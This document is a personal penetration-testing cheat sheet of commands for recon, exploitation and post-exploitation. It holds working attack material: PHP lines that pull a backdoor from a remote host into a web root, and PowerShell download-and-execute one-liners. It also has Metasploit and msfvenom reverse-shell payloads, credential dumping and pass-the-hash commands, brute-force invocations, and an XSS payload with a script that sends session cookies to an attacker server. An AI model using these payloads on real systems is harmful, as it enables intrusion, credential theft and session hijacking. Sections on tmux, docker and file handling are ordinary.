####################
### GENERAL	   #
####################

# ----- tmux ----- #
#### https://danielmiessler.com/study/tmux/#screen
### Install ###
apt-get install tmux

### tmux commands ###
CTRL+R keyword (recursive search in history)

CTRL+B 0 (switch between windows)

tmux ls

tmux attach -t sessionNAME

ctrl+B d (deattach)


_________________ vi ~/.tmux.conf ____________

set -g history-limit 10000
set -g allow-rename off

#search mode VI
set-window-option -g mode-keys vi

#logging
run-shell /opt/tmux-logging/logging.tmux

____________________

#### Tmux cheatsheet

#### Outside Tmux

-   tmux -u to load tmux with unicode support
-   tmux new -s <session_name> to create named session
-   tmux list-sessions or tmux ls to list sessions
-   tmux attach -t <session_name> or tmux a -t <session_name> to reattach to a session
-   mux kill-session -t <session_name> to kill sessions

#### Inside Tmux

-   Ctrl+b c to create new window
-   Ctrl+b ,  to rename window
-   Ctrl+b p to switch to previous window
-   Ctrl+b n to switch to next window
-   Ctrl+b w to list windows
-   Ctrl+b & to kill a window
-   Ctrl+b % to split panes vertically
-   Ctrl+b :  "split-window" or
    Ctrl+b " to split horizontally
-   Ctrl+b : "break-pane" or
    Ctrl+b + to make a pane its own window
-   Ctrl+b d to detach from a session
-   Ctrl+b o to switch to next pane
-   Ctrl+b q  to Show pane numbers (when the numbers show up type the key to go to that pane)
-   Ctrl+b { to move current pane to right
-   Ctrl+b } to move current pane to left
-   Ctrl+b z to zoom a pane
-   Ctrl+b left/right arrow to leftarrow/rightarrow (move between planes)

##### Note:

-   Ctrl+b : is used to give named commands
-   Ctrl+b ? to list bindings

ATL+. - goes through history


#### Find hashes of file in folder ####
find . -type f -exec md5sum {} \; 

####################
###      RECON	   #
####################

# ----- PORT SCANNING ----- #

### Basic Scan
nmap -sS -sV -sC -n --open --reason -oA nmap10.10.10.47 10.10.10.47

SYN SCANNING (half scan) 

### NMAP SCRIPTS LOCATION
/usr/share/nmap/scripts
#### To see categories of each script
cat /opt/nmap-6.4.7/share/nmap/scripts/script.db

### PING SWEEP
nmap -sn 192.168.1.1/24

### NMAP GOOD PARAMETERS

--script-trace = shows what script is doing
--reason = Display the reason a port is in a particular state

--top--ports (nmap -sT --top-ports 20 IPAddress -oG filename.txt)

-sV = Banner grabbing

-O = OS fingerprinting

-A: Enable OS detection, version detection, script scanning, and traceroute

--open = only display results of open ports

nmap -g88 -sS -Pn -n -p 445 --open --reason 10.10.2.0/24 -oA results

### Extract open ports from nmap file
grep -oP ' [\d]{1,5}/' filename.gnmap | sed 's/[ /n]//g' |tr '\n' ','

# ----- SMB (PORT 139, 445) ----- #

### Identify smb or netbios services
nbtscan 192.168.1.0/24

# ----- SMTP (PORT 25) ----- #
nc -nv IP ADDRESS 25
VRFY USERID

## Bash to connect to smb from userlist
for user in $(cat users.txt); do echo VRFY $user | nc -nv IPADDRESS 25 2>/dev/null | grep ^"250"; done

# ----- SNMP (PORT 161)----- #
nmap -sU --open -p 161 IPADDRESS

### Brute force community string
onesixtyone -c community -i ips

### Once community string is discovered, data can be reterived by SNMPWALK
### List of running programs
snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.25.4.2.1.2

### List of open tcp ports
snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.6.13.1.3

### List of installed software 
snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.25.6.3.1.2

## Other Tools
SNMPENUM
SNMPCHECK

# ----- VULN SCANNING ----- #
nmap -p 80 --script all IPADDRESS

## Other Tools
openvas-setup


# ----- Dirbuster ----- #
dirb http://10.10.2.1 /usr/share/dirb/wordlists/vulns/apache.txt -r -o output.txt

gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html -u http://10.10.10.48 - t 25 -o gobuster_10.10.10.48



for ip in $(cat webservers80.txt);do dirb http://$ip /usr/share/dirb/wordlists/vulns/apache.txt -r -o $ip/dirb_$ip.txt; done


# ----- NIKTO ----- #
nikto -host 10.10.10.47 -port 80 -o nikto10_10_10_47.html -Format htm

# ----- PHP LFI/RFI ----- #
https://hakin9.org/web-application-penetration-testing-local-file-inclusion-lfi-testing/
~~~~ 
<?php phpinfo(); ?>

<?php echo shell_exec('whoami'); ?>

<?php print system('grep -vE "nologin|false" /etc/passwd|sed "s/ /\n/g"'); ?>

<?php print system('find / -perm -2 -type d 2>/dev/null|sed "s/ /\n/g"'); ?>

<?php file_put_contents("/var/www/html/uploads/nshell.php", file_get_contents("http://10.10.15.99/simple-backdoor.php")) ?>

~~~~ 
####################
###  EXPLOITATION  #
####################


####################
###  POST EXPLOIT  #
####################

# ----- Search ----- #
find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t


# ----- NetCat ----- #
### Connect using netcat
nc -nv IPaddress port

### Netcat listner
nv -nlvp 4444

## Netcat transfer

### Receiver
nc -l -p 1234 > out.file

### Sender
nc -w 3 [destination] 1234 < out.file

### SIMPLE TCP & UDP PORT SCAN
nc -nvv -w 1 -z IPADDRESS START_PORT-END_PORT
nc -unvv -w 1 -z IPADDRESS START_PORT-END_PORT


# ----- NCat (Supports encrypted tunnel) ----- #
### Listener
ncat -nlvp IPAddress 4444

### Connect
ncat -v IPAddress 4444 --ssl



# ----- Transferring Files from Linux to  ----- #
### Python Webserver 
python -m SimpleHTTPServer


### Transfer to Windows with no broswer
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\name\Desktop\met8888.exe')"

powershell "IEX (New-Object Net.Webclient).DownloadString('http://SERVER/script.ps1')"

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File “YourScript.ps1” 

### Python reverse shell
### https://github.com/infodox/python-pty-shells
### wget path -O /dev/shm/.file.py

python tcp_pty_backconnect.py

### Listener shell, change ip and port
python tcp_pty_shell_handler.py	-b 10.1.1.1:3113



# ----- Bash ----- #

### For loop
for ip in $(cat file.txt); do echo $ip; done

### Create directory structure for each IP in file.txt
for ip in $(cat file.txt); do mkdir -p "$ip"/{penetration,notes,pillage,remote-enum,root-in-10-steps-or-less}; done

### Parse file data
cut -d'.' -f1 filename.txt |sort -u

### Convert newline to comma
cat filename.txt | tr '\n' ,

### Wordlist locations
/usr/share 

### Remove Space from file name
for f in *\ *; do mv "$f" "${f// /_}"; done

### BULK screenshots using ffmpeg

	#!/bin/bash
	# Remove space from fiel name
	for f in *\ *; do mv "$f" "${f// /_}"; done;
	# take screenshot of all files in folder
	for file in $(ls | cut -d'.' -f1);do ffmpeg -i $file.mp4 -vframes 1 -s 1280x720 $file.jpg; done;
	# convert add 0 for better sorting (1.jpg to 01.jpg)
	#for i in $(ls | grep jpg|cut -d'_' -f3|cut -d'.' -f1);do if (($i < 26));then mv *$i.jpg 0$i.jpg; fi ; done;
	for i in $(ls | cut -d'_' -f2| cut -d '.' -f1);do if (($i < 26));then mv OnDemand_$i.jpg 0$i.jpg; fi ; done;
	# Get folder name to rename pdf
	Fname="$(pwd | cut -d'/' -f8)";
	# Use imagemagicK to convert jpg to pdf
	convert *.jpg ../$Fname.pdf;
	# remove jpg
	rm *.jpg;
	exec bash



# ----- Linux Commands ----- #
### Process Running
netstat -antp | grep sshd

### Start HTTP Service (/var/www)
service apache2 start

### Service Persistence on reboot 
update-rc.d ssh enable
update-rc.d apache2 enable


# ----- Google Hacking CMD ----- #
### Search specific site
Site:"microsoft.com"

### Exclude results from www.microsoft.com
Site:"microsoft.com" -site:"www.microsoft.com

### Search specific file type
site:"microsoft.com: filetype:ppt

intitle:"VNC viewer for java"

inurl:"/specific/url/"

# ----- DNS ENUMBERATION ----- #
### name server
host -t ns domain.com

### mail server
host -t mx domain.com

### Forward lookup (domain to IP)
for subdomain in $(list.txt);do nslookup $subdomain.DOMAIN.com|grep "Address: " | cut -d " " -f1,4;done

### Reverse DNS lookup (IP range to doamin)
for ip in (seq 1 255); do host 10.10.10.$ip |grep "DOMAIN" |cut -d" " -f1,5; done

### ZONE TRANSFERS (Get all domains in DNS)
host -l ns DOMAIN.COM

## BUILT TOOLS
DNSRECON, DNSENUM





# ----- Metasploit ----- #
jobs
sessions -i 1

info exploit/multi/handler
use exploit/multi/handler
show options
show payloads
exploit -j
show jobs
session -l
sessions -i 1


cme smb -U USERID -p PASSWORD --local-auth IPADDRESS

# ----- Window CMD To RUN ----- #
whoami
net user
cmd /c
reg
msbuild
wscript
netstat -an /find "LISTEN"

### SMB session 
net use \\TargetIP PASSWORD /u:USERID

### Check if user is in local admins group
net localgroup administrators

# ----- RDP from LINXU to Win ----- #
rdesktop -u USERID -p PASSWORD IPADDRESS -f

# ----- TRICKS AND TIPS ----- #
### Command output on screen and on file
ls -l 2>&1 | tee file.txt

### Convert python exploit to Windows Exe
pywin

# ----- PRIVELEDGE ESCALATION ----- # 

### DownLoad exploit with wget
wget -O exploitName.c https://www.exploit-db.com/download/12932

### FIND MISSING PATCHES
c:\> wmic qfe get Caption,Description,HotFixID,InstalledOn

Speachsploit MS16 windows local

### OTHER TOOLS
### Source: https://wiki.securityweekly.com/TS_Episode02

### PowerUp by harmj0y: https://github.com/PowerShellMafia/PowerSploit
powershell -exec bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

Potato by foxglovesec: https://github.com/foxglovesec/Potato
Tater (PowerShell Implementation of Hot Potato exploit): https://github.com/Kevin-Robertson/Tater
SessionGopher: https://github.com/fireeye/SessionGopher


### LINUX
id
cat /etc/shadow

# ----- Password Dump ----- # 
### Windows (they dump pass hashes from lsas process)
pwdump and fgdump

### WCE (Windows Credential Editor Can steal ntml hashes from memory)
wce64.exe -w	

# ----- Password Cracking ----- # 
john hashes.txt

### To change password policy
/etc/john/john.conf

### Medusa
medusa -h ipAddress -u admin -P password.txt -M http -m DIR:admin -T 20

### Ncrack
ncrack -v -f --user admin -P password.txt rdp://IPADDRESS,CL=1

### Hydra
hydra -l admin -P password.txt -v IPADRESS ftp


# ----- PASS-THE-HASH ----- #
### https://www.hacklikeapornstar.com/all-pth-techniques/
LM hash for empty password
aad3b435b51404eeaad3b435b51404ee

NTLM hash for empty password
31d6cfe0d16ae931b73c59d7e0c089c0

export SMBHASH=aad3b435b51404eeaad3b435b51404ee:DUMPEDPASSEDhash

pth-winexe -U administrator% //IPADDRESS cmd

# ----- PASSWORD CUSTOMIZING ----- #

cewl www.website.com -m6 -w /output/path.txt

# ----- Findings ----- #

Target Ip Address:
Target Name:
Target OS:
How Discovered:
Listening Ports:
Known Vulns:
Admin Accounts/Passwords:
Other Accounts/Passwords:
Misc Notes:

# ----- Port Forwarding ----- #

/etc/rinetd.conf

#### On victim machine
plink -l root -pw password AttackerIP -R 3390:127.0.0.1:3389

#### Attacker Machine (Verify if 3390 is listening/connected)
netstat -antp | grep LISTEN
rdesktop 127.0.0.1:3390

# ----- MetaSploit ----- #
/etc/init.d/postgresql start
/etc/init.d/metasploit start

help
show auxilary
show options



### setg makes metasploit remember settings
setg RHOTS 10.10.10.1

### meterpreter commands
sysinfo
getuid
use priv
getsystem
search -f *filename.txt
upload /usr/share/windows-binaries/nc.exe c:\\users\
download c:\\windows\file.txt /tmp/
shell

#### Listner will keep listening even after first connection. Useful for multiple shells.
set ExitOnSession false
exploit -j

### Metasploit Database Integration
db_export
db_nmap 
db_import Nmap.xml
services -p 80
hosts
vuln

#### resource command for metasploit.(Run inside MSF console). File contain instructions for metasploit.
resource /var/lib/veil-evasion/output/handlers/file.rc


use/windows/meterpreter/reverse_https
use/windows/meterpreter/reverse_tcp_allports

### Standalone payloads (this will need listner on port 443)
msfpayload use /windows/meterpreter/reverse_https LHOST=53.232.22.2 LPORT=443 x >/var/www/payload.exe

### Metasploit listener
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST
set LPORT
exploit


use exploit/widows/local/bypassuac
show options
session -l
set SESSION 1
set PAYLOAD
set LHOST 65.3.2.1
set LPORT 8888
run

### Metasploit POST EXPLOITATION
getuid
getprivs
hashdump
background
ps
migrate 9829
sessions -l
get pid

# ----- PORT Pivoting ----- #
mknod /tmp/backpipe p
nc -l -p 2000 0</tmp/backpipe | nc localhost 22 1>/tmp/backpipe

# ----- IP Tables ----- #
### Block
iptables -D INPUT -s 192.168.1.1 -p tcp --dport 22 -j DROP

### Open
iptables -D INPUT -s 192.168.1.1 -p tcp --dport 22 -j ACCEPT

### Check
iptables -n --list


# ----- POST EXPLOITATION ----- #




# ----- Hash ----- #
hash-identifier

# ----- TCPDUMP ----- #

tcpdump -nn -i tun0 -s 0

### Show TCP Packet against target 10.10.10.10
tcpdump -nnx tcp and dst 10.10.10.10

### Show TCP Packet from target 10.10.10.10
tcpdump -nn udp and src 10.10.10.10

### Show TCP port 80 Packets going to or from host 10.10.10.10
tcpdump -nn tcp and port 80 and host 10.10.10.10

### dirb summary of findings
egrep -ir 'found' */dirb*

# ----- ProxyChains ----- #

### configure browser sock4 proxy 127.0.0.1:1234 on host
ssh -D 127.0.0.1:1234 root@ipaddress

127.0.0.1:1234 > ssh basion > vpn to lab

# ----- Send Terminal Traffic via Burp ----- #
burp > proxy > options > Add "Bind to Port" 8081 and Request handling redirect to host and port
Now send traffic to localhost:8081 and it will go via burp

# ----- lair Frameworkd Dockers ----- #

replace docker-compose.yml from my script folder.
docker-compose build
docker-compose up
wget https://github.com/lair-framework/drone-nmap/releases/download/v2.1.1/drone-nmap_linux_amd64
chmod +x drone-nmap_linux_amd64
export LAIR_API_SERVER='https://admin@localhost:2965@172.16.14.220:11013'
./drone-nmap_linux_amd64 xdddcvSt333 ../Desktop/initscan.xml


#### Import Nmap scans to lair
./drone-nmap_darwin_amd64 5T9mjLQEp32g8BXCH /Path/nmap.xml



# ----- msfvenom ----- #
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT 80 -f exe > /tmp/file.exe

# ----- XSS Payloads ----- #

#### XSS Injection payload:
<script src=//10.1.1.110/1.js></script>

1.js payload content:

var i=new Image(); i.src="http://10.1.1.110/c.php?q="+document.cookie;

c.php that collects session cookies and stores them in a file:

<?php $cookie = $_SERVER['QUERY_STRING']; $logfile=fopen("cookies.txt", "a+"); fputs($logfile, "COOKIE REC: $cookie" . PHP_EOL); fclose($logfile); ?>

# ----- Dockers commands ----- #
####List all containers (only IDs)
docker ps -aq

#### Stop all running containers
docker stop $(docker ps -aq)

#### Remove all containers
docker rm $(docker ps -aq)

#### Remove all images
docker rmi -f $(docker images -q)
